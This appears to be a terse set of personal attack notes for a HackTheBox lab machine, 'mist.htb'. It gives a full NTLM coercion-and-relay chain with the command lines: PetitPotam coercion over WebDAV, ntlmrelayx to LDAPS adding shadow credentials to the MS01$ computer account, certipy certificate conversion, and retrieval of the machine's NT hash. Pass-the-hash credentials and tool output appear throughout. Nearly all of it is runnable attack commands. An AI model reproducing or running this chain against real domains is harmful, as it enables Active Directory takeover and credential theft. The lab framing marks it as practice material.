# Force Auth

## open up webdav
.\gost.exe -L tcp://:9999/10.10.16.14:80

## activate webdav
net use h: http://10.10.16.39

## start responder
sudo responder -I tun0

## check if webdav is running
proxychains4 netexec smb 192.168.100.101 -u 'Brandon.Keywarp' -H DB03D6A77A2205BC1D07082740626CC9 -M webdav

## stop responder
#relay
proxychains4 ntlmrelayx.py -t ldaps://192.168.100.100 --shadow-credentials --shadow-target 'MS01$' 

## hit relay
python3 PetitPotam.py -hashes :db03d6a77a2205bc1d07082740626cc9 -u Brandon.Keywarp -no-pass -d mist.htb -pipe all MS01@8888/add 192.168.100.101 

## if got ldap interactive shell 

1. clear_shadow_creds MS01$

2. set_shadow_creds MS01$

// fix:  set_shadow_creds ms01$ 

## Get Certificate

Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb
Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108

KeyCredential generated with DeviceID: a664078c-93f9-d1d6-39bd-afd13348a576
Shadow credentials successfully added!
Saved PFX (#PKCS12) certificate & key at path: 435n2mdK.pfx
Must be used with password: CSfB6vYHj3yFiZPlZVVh

## Convert Certificate

export PFX_PASSWORD=CSfB6vYHj3yFiZPlZVVh
export PFX_FILE=435n2mdK.pfx
certipy cert -password $PFX_PASSWORD -pfx $PFX_FILE -out MS01.pem
openssl pkcs12 -in MS01.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out MS01.pfx

## certification to NTLM Hash

proxychains4 certipy auth -pfx MS01.pfx -dc-ip 192.168.100.100 -u "MS01$" -d mist.htb

> [Apr 02, 2024 - 16:54:44 (UTC)] exegol-hackthebox /workspace # proxychains4 certipy auth -pfx ms01.pfx -dc-ip 192.168.100.100 -username 'MS01$' -domain 'mist.htb'                                   
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: ms01$@mist.htb
[*] Trying to get TGT...
[proxychains] Strict chain  ...  198.19.249.3:1080  ...  192.168.100.100:88  ...  OK
[*] Got TGT
[*] Saved credential cache to 'ms01.ccache'
[*] Trying to retrieve NT hash for 'ms01$'
[proxychains] Strict chain  ...  198.19.249.3:1080  ...  192.168.100.100:88  ...  OK
[*] Got hash for 'ms01$@mist.htb': aad3b435b51404eeaad3b435b51404ee:4a74fc05400345d580cf58aec3e6d833

> 4a74fc05400345d580cf58aec3e6d833

